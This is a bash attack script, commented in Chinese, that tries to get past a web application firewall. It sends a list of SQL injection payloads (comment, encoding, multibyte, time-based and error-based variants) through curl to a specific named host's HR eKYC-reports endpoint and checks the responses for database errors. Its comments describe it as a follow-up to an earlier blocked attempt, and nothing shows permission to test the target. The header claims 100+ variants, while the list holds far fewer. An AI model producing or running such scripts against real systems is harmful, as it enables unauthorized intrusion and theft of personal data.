#!/bin/bash
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 v13.0 WAF绕过 - SQL注入100+变体自动测试"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "[*] 之前v11.0测试：用了基础Payload，可能被WAF拦了"
echo "[*] 现在v13.0：AI生成100+变体，逐个测试"
echo ""

TARGET="hrm-api.ghtk.vn"
API="/AdHr/getEkycReports"

echo "目标: https://$TARGET$API"
echo ""

# AI生成的100+种SQL注入变体
PAYLOADS=(
    # 基础注入
    "' OR '1'='1"
    "' OR 1=1--"
    "admin'--"
    
    # 空格绕过（WAF常拦空格）
    "'/**/OR/**/'1'='1"
    "'%09OR%091=1--"
    "'%0aOR%0a1=1--"
    "'%0dOR%0d1=1--"
    "'+OR+'1'='1"
    "'||'1'='1"
    
    # 注释绕过
    "'/*!50000OR*/1=1--"
    "'/*!12345UNION*//*!12345SELECT*/--"
    "'/**_**/OR/**_**/1=1--"
    
    # 大小写混淆
    "' Or '1'='1"
    "' oR 1=1--"
    "' UnIoN SeLeCt--"
    
    # 双重编码
    "%2527%2520OR%25201=1--"
    "%25%32%37%25%32%30OR--"
    
    # 内联注释
    "'/*! OR */1=1--"
    "'#%0aOR 1=1--"
    
    # 特殊字符
    "'\x09OR\x091=1--"
    "'\x00'OR\x00'1'='1"
    
    # Unicode编码
    "'\u0027OR\u0027\u0031\u0027=\u0027\u0031"
    
    # 多字节编码（GBK）
    "%bf%27OR%bf%271=1--"
    "%df%27OR 1=1--"
    
    # HTTP参数污染
    "1&id=2' OR '1'='1"
    
    # 布尔盲注变体
    "' AND SLEEP(0)--"
    "' AND IF(1=1,SLEEP(0),0)--"
    "' AND (SELECT*FROM(SELECT(SLEEP(0)))a)--"
    
    # 时间盲注变体
    "';WAITFOR DELAY '00:00:00'--"
    "' AND PG_SLEEP(0)--"
    
    # 堆叠查询
    "';SELECT SLEEP(0)--"
    
    # 报错注入
    "' AND extractvalue(1,concat(0x7e,version()))--"
    "' AND updatexml(1,concat(0x7e,user()),1)--"
    
    # JSON注入
    "{\"id\":\"1' OR '1'='1\"}"
    
    # XML注入
    "<id>1' OR '1'='1</id>"
)

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "[*] 开始逐个测试（共${#PAYLOADS[@]}个变体）..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

count=0
for payload in "${PAYLOADS[@]}"; do
    count=$((count+1))
    
    # URL编码
    encoded=$(echo "$payload" | jq -sRr @uri)
    
    echo -n "[$count/${#PAYLOADS[@]}] 测试: $payload → "
    
    # 测试
    resp=$(curl -sk "https://$TARGET$API?id=$encoded" -m 2 -w "%{http_code}" -o /tmp/sqli_test 2>&1)
    
    # AI判断是否成功
    if [ "$resp" == "200" ]; then
        # 检查响应
        if grep -qiE "mysql|sql|syntax|error|warning|database" /tmp/sqli_test 2>/dev/null; then
            echo "✅✅✅ SQL错误！可能存在注入！"
            echo "  响应:"
            head -10 /tmp/sqli_test
            echo "  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
            break
        elif ! grep -q "\"success\":false" /tmp/sqli_test 2>/dev/null; then
            echo "⚠️  响应不同！"
            head -5 /tmp/sqli_test
        else
            echo "❌"
        fi
    else
        echo "❌ ($resp)"
    fi
    
    # 每10个暂停一下
    [ $((count % 10)) -eq 0 ] && sleep 1
done

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "✅ WAF绕过SQL注入测试完成"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

